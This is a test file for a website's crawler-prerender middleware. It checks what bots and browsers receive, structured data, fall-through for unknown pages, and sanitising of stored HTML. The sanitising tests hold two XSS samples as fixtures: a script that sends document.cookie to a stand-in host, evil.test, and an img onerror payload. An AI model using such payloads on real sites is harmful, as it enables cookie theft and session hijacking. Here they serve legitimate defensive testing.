import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import middleware from '../../middleware';

/**
 * Functional tests for the crawler prerender path.
 *
 * These cover the behaviour that the AdSense/SEO fix depends on:
 *   - indexing crawlers receive the article body, not an empty shell
 *   - real users are never intercepted
 *   - unknown or unpublished slugs fall through to the SPA rather than 404-ing
 *
 * Supabase is mocked at the fetch boundary, so no network or env config is needed.
 */

const GOOGLEBOT = 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)';
const ADSENSE = 'Mediapartners-Google';
const CLAUDEBOT = 'Mozilla/5.0 (compatible; ClaudeBot/1.0; +claudebot@anthropic.com)';
const FACEBOOK = 'facebookexternalhit/1.1';
const CHROME = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36';

const POST_ROW = {
  title: 'How to Stop Buddy Punching',
  excerpt: 'Buddy punching costs employers real money. Here is how selfie verification stops it.',
  cover_image: null,
  content: '<p>Buddy punching is when one employee clocks in for another.</p><h2>Why it matters</h2><p>It inflates payroll.</p>',
  author_name: 'Monirul Islam',
  published_at: '2026-08-01T09:00:00Z',
  category: 'Attendance',
  reading_time: 7,
};

function req(url: string, ua: string): Request {
  return new Request(url, { headers: { 'user-agent': ua } });
}

let fetchMock: ReturnType<typeof vi.fn>;

beforeEach(() => {
  fetchMock = vi.fn(async (input: any) => {
    const url = String(input);
    if (url.includes('/rest/v1/blog_posts')) {
      // Index listing vs single post
      if (url.includes('slug=eq.')) {
        return url.includes('slug=eq.missing')
          ? new Response('[]', { status: 200 })
          : new Response(JSON.stringify([POST_ROW]), { status: 200 });
      }
      return new Response(JSON.stringify([{ ...POST_ROW, slug: 'how-to-stop-buddy-punching' }]), { status: 200 });
    }
    if (url.includes('/rest/v1/tutorials')) {
      if (url.includes('slug=eq.')) {
        return new Response(JSON.stringify([{ ...POST_ROW, title: 'Setting Up Your Organization' }]), { status: 200 });
      }
      return new Response(JSON.stringify([{ ...POST_ROW, slug: 'setting-up-organization', title: 'Setting Up Your Organization' }]), { status: 200 });
    }
    return new Response('[]', { status: 200 });
  });
  vi.stubGlobal('fetch', fetchMock);
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe('crawler detection', () => {
  it('passes real browsers straight through to the SPA', async () => {
    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', CHROME));
    expect(res).toBeUndefined();
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it.each([
    ['Googlebot', GOOGLEBOT],
    ['AdSense crawler', ADSENSE],
    ['ClaudeBot', CLAUDEBOT],
  ])('serves full article content to %s', async (_name, ua) => {
    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', ua));
    expect(res).toBeDefined();
    expect(res!.headers.get('X-Prerender')).toBe('index-bot');

    const html = await res!.text();
    expect(html).toContain('<article>');
    expect(html).toContain('Buddy punching is when one employee clocks in for another.');
    expect(html).toContain('<h2>Why it matters</h2>');
    expect(html).toContain('<h1>How to Stop Buddy Punching</h1>');
  });

  it('serves metadata only to link-preview bots', async () => {
    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', FACEBOOK));
    expect(res!.headers.get('X-Prerender')).toBe('social-bot');

    const html = await res!.text();
    expect(html).toContain('og:title');
    expect(html).not.toContain('<article>');
  });
});

describe('article document', () => {
  it('includes author, publish date, and reading time', async () => {
    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
    const html = await res!.text();
    expect(html).toContain('By Monirul Islam');
    expect(html).toContain('<time datetime="2026-08-01T09:00:00Z">2026-08-01</time>');
    expect(html).toContain('7 min read');
  });

  it('emits BlogPosting and BreadcrumbList JSON-LD', async () => {
    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
    const html = await res!.text();

    const blocks = [...html.matchAll(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/g)]
      .map((m) => JSON.parse(m[1]));

    expect(blocks).toHaveLength(2);
    expect(blocks[0]['@type']).toBe('BlogPosting');
    expect(blocks[0].headline).toBe('How to Stop Buddy Punching');
    expect(blocks[0].author).toEqual({ '@type': 'Person', name: 'Monirul Islam' });
    expect(blocks[0].datePublished).toBe('2026-08-01T09:00:00Z');

    expect(blocks[1]['@type']).toBe('BreadcrumbList');
    expect(blocks[1].itemListElement.map((x: any) => x.name)).toEqual(['Home', 'Blog', 'How to Stop Buddy Punching']);
  });

  it('uses TechArticle for guides', async () => {
    const res = await middleware(req('https://openhrapp.com/how-to-use/setting-up-organization', GOOGLEBOT));
    const html = await res!.text();
    expect(html).toContain('"@type":"TechArticle"');
  });

  it('sets a canonical URL and a self-referencing og:url', async () => {
    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
    const html = await res!.text();
    expect(html).toContain('<link rel="canonical" href="https://openhrapp.com/blog/how-to-stop-buddy-punching">');
    expect(html).toContain('<meta property="og:url" content="https://openhrapp.com/blog/how-to-stop-buddy-punching">');
  });

  it('varies on user-agent so the SPA response is not cached for crawlers', async () => {
    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
    expect(res!.headers.get('Vary')).toBe('User-Agent');
  });
});

describe('index pages', () => {
  it('lists published posts on /blog with links crawlers can follow', async () => {
    const res = await middleware(req('https://openhrapp.com/blog', GOOGLEBOT));
    const html = await res!.text();
    expect(html).toContain('href="/blog/how-to-stop-buddy-punching"');
    expect(html).toContain('"@type":"CollectionPage"');
  });

  it('lists guides on /how-to-use', async () => {
    const res = await middleware(req('https://openhrapp.com/how-to-use', GOOGLEBOT));
    const html = await res!.text();
    expect(html).toContain('href="/how-to-use/setting-up-organization"');
  });

  it('renders the feature index without hitting the database', async () => {
    const res = await middleware(req('https://openhrapp.com/features', GOOGLEBOT));
    const html = await res!.text();
    expect(html).toContain('href="/features/attendance-tracking"');
    expect(fetchMock).not.toHaveBeenCalled();
  });

  it('renders the homepage with links into the content hub', async () => {
    const res = await middleware(req('https://openhrapp.com/', GOOGLEBOT));
    const html = await res!.text();
    expect(html).toContain('href="/how-to-use"');
    expect(html).toContain('href="/blog"');
  });

  it('does not prerender index pages for link-preview bots', async () => {
    const res = await middleware(req('https://openhrapp.com/blog', FACEBOOK));
    expect(res).toBeUndefined();
  });
});

describe('fall-through behaviour', () => {
  it('falls through to the SPA for an unknown slug', async () => {
    const res = await middleware(req('https://openhrapp.com/blog/missing', GOOGLEBOT));
    expect(res).toBeUndefined();
  });

  it('falls through when Supabase errors', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => new Response('boom', { status: 500 })));
    const res = await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
    expect(res).toBeUndefined();
  });

  it('falls through for an unknown feature slug', async () => {
    const res = await middleware(req('https://openhrapp.com/features/not-a-feature', GOOGLEBOT));
    expect(res).toBeUndefined();
  });

  it('only requests PUBLISHED rows', async () => {
    await middleware(req('https://openhrapp.com/blog/how-to-stop-buddy-punching', GOOGLEBOT));
    const requested = String(fetchMock.mock.calls[0][0]);
    expect(decodeURIComponent(requested)).toContain('status=eq.PUBLISHED');
  });
});

describe('untrusted content handling', () => {
  it('strips script tags out of stored article HTML', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify([{
      ...POST_ROW,
      content: '<p>ok</p><script>fetch("https://evil.test?c="+document.cookie)</script>',
    }]), { status: 200 })));

    const res = await middleware(req('https://openhrapp.com/blog/x', GOOGLEBOT));
    const html = await res!.text();
    expect(html).toContain('<p>ok</p>');
    expect(html).not.toContain('evil.test');
    expect(html).not.toMatch(/<script(?! type="application\/ld\+json")/);
  });

  it('escapes a title that contains markup', async () => {
    vi.stubGlobal('fetch', vi.fn(async () => new Response(JSON.stringify([{
      ...POST_ROW,
      title: '<img src=x onerror=alert(1)>',
    }]), { status: 200 })));

    const res = await middleware(req('https://openhrapp.com/blog/x', GOOGLEBOT));
    const html = await res!.text();

    // The payload may appear as inert text; what must never appear is a live tag.
    expect(html).not.toMatch(/<img\b/i);
    expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;');

    // Inside JSON-LD the angle brackets must be unicode-escaped so the payload
    // cannot break out of the <script> block.
    const ld = html.match(/<script type="application\/ld\+json">([\s\S]*?)<\/script>/)![1];
    expect(ld).not.toMatch(/<img/i);
    expect(ld).toContain('\\u003cimg');
  });
});
